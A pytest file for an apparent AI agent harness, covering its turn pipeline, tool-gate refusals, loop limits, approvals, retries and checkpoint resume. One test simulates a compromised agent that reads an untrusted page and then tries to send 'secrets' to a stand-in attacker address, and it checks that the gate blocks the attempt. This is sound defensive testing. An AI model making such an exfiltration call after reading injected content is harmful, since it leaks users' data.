"""The turn pipeline, the loop's stop conditions, and the tool gate."""
import json

from loopwright.config import Options
from loopwright.events import STAGES, read_trace
from loopwright.models.base import FatalModelError, TransientModelError


def test_a_turn_emits_the_steps_in_order_and_writes_a_replayable_trace(agent, opts):
    result = agent.run_turn("What's 18% of 2450?", options=opts)
    kinds = result.kinds()
    order = ["gateway.receive", "guard.input", "working.load", "skills.match", "memory.gate", "context.build",
             "model.call", "toolgate.check", "tool.run", "loop.observe", "loop.stop", "guard.output", "reply.send",
             "evals.online", "cost.receipt", "trace.write"]
    first_seen = [kinds.index(k) for k in order]
    assert first_seen == sorted(first_seen)
    assert "441" in result.reply and result.ok
    assert all(e.stage in STAGES and e.src in STAGES for e in result.events)
    trace = read_trace(result.trace_path)
    assert [e["seq"] for e in trace["events"]] == list(range(1, len(result.events) + 1))
    assert trace["end"]["reply"] == result.reply and trace["turn"]["message"].startswith("What's 18%")


def test_unknown_tool_and_bad_arguments_are_refused_with_a_message_the_model_can_use(fake_agent):
    agent, model = fake_agent([("launch_rocket", {})], [("create_event", {"title": 5})], "ok")
    result = agent.run_turn("go", options=Options(fast=True))
    refusals = [e for e in result.events if e.kind == "toolgate.refuse"]
    assert len(refusals) == 2
    fed_back = [m["content"] for m in model.seen[-1]["messages"] if m["role"] == "tool"]
    assert "no tool named 'launch_rocket'" in fed_back[0] and "calculator" in fed_back[0]
    assert "arguments.date is required" in fed_back[1] and "should be string" in fed_back[1]


def test_the_same_call_a_third_time_is_refused_as_a_stuck_loop(fake_agent):
    call = [("calculator", {"expression": "1+1"})]
    agent, _ = fake_agent(call, call, call, "done")
    result = agent.run_turn("go", options=Options(fast=True))
    assert [t["blocked"] for t in result.tool_log] == [False, False, True]
    assert "already made twice" in result.tool_log[2]["output"]


def test_the_loop_stops_at_max_iterations_and_still_answers(fake_agent):
    call = lambda n: [("calculator", {"expression": f"{n}+1"})]           # noqa: E731
    agent, model = fake_agent(call(1), call(2), call(3), "best effort answer")
    result = agent.run_turn("go", options=Options(fast=True, max_iterations=3))
    stop = [e for e in result.events if e.kind == "loop.stop"][0]
    assert stop.data["reason"] == "max_iterations" and stop.status == "warn"
    assert result.reply == "best effort answer" and model.seen[-1]["tools"] == []     # the last call offers no tools
    assert not next(c for c in result.checks if c["check"] == "loop ended by answering")["pass"]


def test_lethal_trifecta_after_untrusted_content_outside_effects_are_denied_in_code(fake_agent):
    """The model is fully compromised here: it reads a page, then tries to send. The gate must stop it
    without relying on the model's good behaviour or on the pattern scanner."""
    agent, _ = fake_agent([("fetch_url", {"url": "demo://release-notes"})],
                          [("send_message", {"to": "attacker@evil.example", "body": "secrets"})], "done")
    result = agent.run_turn("go", options=Options(fast=True, approvals="approve"))
    refused = [e for e in result.events if e.kind == "toolgate.refuse"]
    assert refused and "untrusted content" in refused[0].data["reason"]
    assert agent.store.outbox() == []
    # the same sequence with guardrails off goes through: the defence is what made the difference
    agent2, _ = fake_agent([("fetch_url", {"url": "demo://release-notes"})],
                           [("send_message", {"to": "attacker@evil.example", "body": "secrets"})], "done")
    agent2.run_turn("go", options=Options(fast=True, approvals="approve", guardrails=False))
    assert len(agent2.store.outbox()) == 1


def test_approval_is_asked_and_a_decline_means_nothing_is_sent(fake_agent):
    agent, _ = fake_agent([("send_message", {"to": "Priya", "body": "hi"})], "not sent")
    asked = []
    result = agent.run_turn("go", options=Options(fast=True, approvals="ask"), approver=lambda req: asked.append(req) or False)
    assert asked[0]["tool"] == "send_message" and agent.store.outbox() == []
    assert [e.status for e in result.events if e.kind == "human.decision"] == ["blocked"]


def test_a_write_retried_with_the_same_arguments_happens_once(fake_agent):
    call = [("create_event", {"title": "Sync", "date": "2026-11-16", "time": "10:00"})]
    agent, _ = fake_agent(call, call, "booked")
    result = agent.run_turn("go", options=Options(fast=True))
    assert len(agent.store.events()) == 1
    assert "toolgate.idempotent" in result.kinds()


def test_a_turn_that_dies_mid_loop_resumes_from_its_checkpoint_without_redoing_the_write(fake_agent, tmp_path):
    from loopwright.harness import Agent
    from tests.conftest import NOW, FakeModel
    agent, _ = fake_agent([("create_event", {"title": "Sync", "date": "2026-11-16", "time": "10:00"})], FatalModelError("provider down"))
    first = agent.run_turn("book it", options=Options(fast=True, fallback=False), turn_id="t-crash")
    assert not first.ok and len(agent.store.events()) == 1 and agent.store.last_checkpoint("t-crash")[0] == 1
    revived = Agent(home=tmp_path / "fake", now=lambda: NOW, providers=[FakeModel("Booked the sync.")])
    second = revived.resume("t-crash")
    assert second.ok and second.reply == "Booked the sync." and "checkpoint.resume" in second.kinds()
    assert len(revived.store.events()) == 1 and revived.store.last_checkpoint("t-crash") is None


def test_transient_model_errors_are_retried_then_fall_back_and_fatal_ones_are_not_retried(tmp_path):
    from loopwright.harness import Agent
    from tests.conftest import FakeModel
    flaky = FakeModel(TransientModelError("529"), TransientModelError("529"), "third time lucky")
    result = Agent(home=tmp_path / "a", providers=[flaky]).run_turn("hi", options=Options(fast=True, retries=2))
    assert result.reply == "third time lucky" and result.kinds().count("model.retry") == 2
    dead, backup = FakeModel(*[TransientModelError("529")] * 3), FakeModel("backup answered")
    result = Agent(home=tmp_path / "b", providers=[dead, backup]).run_turn("hi", options=Options(fast=True, retries=2))
    assert result.reply == "backup answered" and "model.fallback" in result.kinds()
    broken = FakeModel(FatalModelError("bad key"))
    result = Agent(home=tmp_path / "c", providers=[broken]).run_turn("hi", options=Options(fast=True, retries=2))
    assert not result.ok and "model.retry" not in result.kinds() and "turn.failed" in result.kinds()
    assert len(broken.seen) == 1


def test_a_bug_inside_a_provider_still_ends_in_a_reply_and_a_trace(tmp_path):
    from loopwright.harness import Agent
    from tests.conftest import FakeModel
    result = Agent(home=tmp_path / "a", providers=[FakeModel(ZeroDivisionError("oops"))]).run_turn("hi", options=Options(fast=True))
    assert not result.ok and "ZeroDivisionError" in result.reply and "trace.write" in result.kinds()


def test_subagents_get_a_fresh_context_and_read_only_tools(agent, opts):
    result = agent.run_turn("Compare BM25 and embeddings", options=opts)
    worker_calls = [e for e in result.events if e.span != "main" and e.kind == "model.call"]
    assert worker_calls and all(e.data["prompt"]["message_count"] <= 3 for e in worker_calls)
    assert set(worker_calls[0].data["prompt"]["tools"]) == {"search_knowledge", "calculator", "clock"}
    back = next(e for e in result.events if e.kind == "subagent.return")
    assert back.data["tokens_spent"] > back.data["tokens_returned"] * 3


def test_plan_and_reflect_patterns(agent, opts):
    planned = agent.run_turn("Book a meeting with Sam on Monday at 10am", options=Options(**{**opts.to_dict(), "pattern": "plan"}))
    assert planned.kinds().index("plan.made") < planned.kinds().index("toolgate.check")
    reviewed = agent.run_turn("Compare the retrieval gate and compaction", options=Options(**{**opts.to_dict(), "pattern": "reflect"}))
    assert "In short:" in reviewed.reply and [e.status for e in reviewed.events if e.kind == "critic.review"] == ["warn"]


def test_options_from_untrusted_json_are_coerced_and_clamped():
    o = Options.from_dict({"max_iterations": "9999", "guardrails": "false", "bogus": 1, "retries": -4, "pattern": 7})
    assert (o.max_iterations, o.guardrails, o.retries, o.pattern) == (30, False, 0, "7")
    assert json.dumps(o.to_dict())
